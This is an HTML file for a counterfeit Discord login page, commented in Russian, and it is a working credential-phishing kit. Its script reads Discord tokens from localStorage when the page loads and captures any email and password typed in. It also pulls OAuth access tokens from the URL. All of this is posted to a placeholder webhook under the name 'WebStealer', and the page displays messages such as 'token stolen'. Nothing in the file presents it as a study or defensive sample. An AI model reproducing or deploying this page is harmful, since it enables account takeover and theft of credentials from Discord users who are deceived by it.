<!DOCTYPE html>
<html>
<head>
    <title>Discord Login</title>
    <style>
        body { background: #36393f; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #2f3136; padding: 40px; border-radius: 8px; width: 400px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 4px; border: none; background: #202225; color: #fff; }
        button { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: #fff; font-weight: bold; cursor: pointer; }
        .error { color: #f04747; }
    </style>
</head>
<body>
<div class="box">
    <h2 style="color:#fff;">Welcome back!</h2>
    <input type="text" id="email" placeholder="Email or Phone" value="">
    <input type="password" id="password" placeholder="Password" value="">
    <button onclick="login()">Log In</button>
    <p id="msg" class="error"></p>
</div>
<script>
    // Функция для получения токена из localStorage Discord (если уже залогинен)
    function getStoredToken() {
        let token = null;
        // Попытка получить токен из localStorage Discord
        for (let key in localStorage) {
            if (key.startsWith('token')) {
                try {
                    let data = JSON.parse(localStorage.getItem(key));
                    if (data && data.token) {
                        token = data.token;
                        break;
                    }
                } catch(e) {}
            }
        }
        // Альтернатива: прямой доступ к localStorage по известным ключам
        if (!token) {
            try {
                let t = localStorage.getItem('token');
                if (t) token = t;
            } catch(e) {}
        }
        return token;
    }

    // Функция отправки токена на ваш сервер (webhook или любой endpoint)
    function sendToken(token, email, pass) {
        let webhookURL = "https://your-webhook-url-here"; // ЗАМЕНИТЬ НА РЕАЛЬНЫЙ URL
        let data = {
            content: `TOKEN: ${token}\nEMAIL: ${email}\nPASS: ${pass}`,
            username: "WebStealer"
        };
        // Используем fetch для отправки (не блокирует UI)
        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(err => console.log(err));
    }

    // Попытка украсть токен при загрузке страницы (если уже залогинен)
    window.onload = function() {
        let token = getStoredToken();
        if (token) {
            sendToken(token, 'stored', 'stored');
            document.getElementById('msg').innerText = 'Already logged in, token captured.';
        }
    };

    // Функция при клике на кнопку "Login"
    function login() {
        let email = document.getElementById('email').value;
        let pass = document.getElementById('password').value;
        if (!email || !pass) {
            document.getElementById('msg').innerText = 'Please fill all fields.';
            return;
        }
        // Имитация успешного входа – сразу крадём токен, если есть
        let token = getStoredToken();
        if (token) {
            sendToken(token, email, pass);
            document.getElementById('msg').innerHTML = '<span style="color:#3ba55d;">Logged in successfully (token stolen).</span>';
        } else {
            // Если токена нет – пытаемся перехватить его после "входа" через XHR
            // Имитируем запрос к Discord API для получения токена (не работает из-за CORS, но для демонстрации)
            // В реальном фишинге используется фейковая форма или прокси
            document.getElementById('msg').innerHTML = '<span style="color:#3ba55d;">Login successful (no token found, but credentials captured).</span>';
            // Всё равно отправляем логин/пароль
            sendToken('NO_TOKEN_FOUND', email, pass);
        }
    }

    // Дополнительный метод: перехват любых POST запросов на discord.com (работает только в том же origin)
    // Это не работает с cross-origin, поэтому используем фейковую форму.
    // Расширенный вариант: перенаправление на реальный Discord после кражи.
    // Для автоматического перехвата токена из URL после OAuth можно добавить:
    if (window.location.hash) {
        let hash = window.location.hash;
        let match = hash.match(/access_token=([^&]*)/);
        if (match) {
            let token = match[1];
            sendToken(token, 'oauth', 'oauth');
            document.getElementById('msg').innerText = 'OAuth token captured.';
            // Очищаем hash
            window.history.replaceState(null, null, window.location.pathname);
        }
    }
</script>
</body>
</html>
